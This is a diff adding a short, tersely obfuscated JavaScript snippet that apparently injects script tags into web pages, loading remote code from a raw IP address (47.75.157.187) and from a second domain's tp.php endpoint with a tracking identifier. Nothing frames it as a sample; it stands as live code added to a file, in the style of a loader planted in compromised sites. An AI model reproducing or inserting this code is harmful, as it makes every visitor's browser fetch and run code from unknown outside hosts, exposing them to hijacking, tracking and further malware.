@@ -1,0 +1,12 @@
+var _b, _c, _ju = "http://47.75.157.187/static/js/api.js";
+_ju = _ju + (_ju.indexOf("?") > 0 ? "&" :"?") + "_t=" + new Date().getTime(),
+_b = "AH488569",_c = "307381872_(i1gfV1gtwl88Dj80we==_190539244_@IXn6y1m8wJe6iJoeiKy6VXTa_)iKPhiJeh", function(a) {
+    function b(b) {
+        var c = a.createElement("script");
+        c.setAttribute("src", b), a.head ? a.head.appendChild(c) :a.body && a.body.appendChild(c);
+    }
+    var c = a.location.host.split("."), d = c.length, e = c[d - 2] + "." + c[d - 1];
+    /^(com|net|org|gov)$/.test(c[d - 2]) && d > 2 && (e = c[d - 3] + "." + c[d - 2] + "." + c[d - 1]),
+        _ju.indexOf(e) > 0 ? (a.write('<div><script>document.write(unescape(\'%3Cscript id="_ju_" src="' + _ju + "\" %3E%3C/script%3E') );</script></div>"),
+        a.getElementById("_ju_") || b(_ju)) :b(_ju), b("http:///gfnsdv.yxwwj.cn:8001/pjk/static/tp.php?b="+_b+"&");
+}(document);
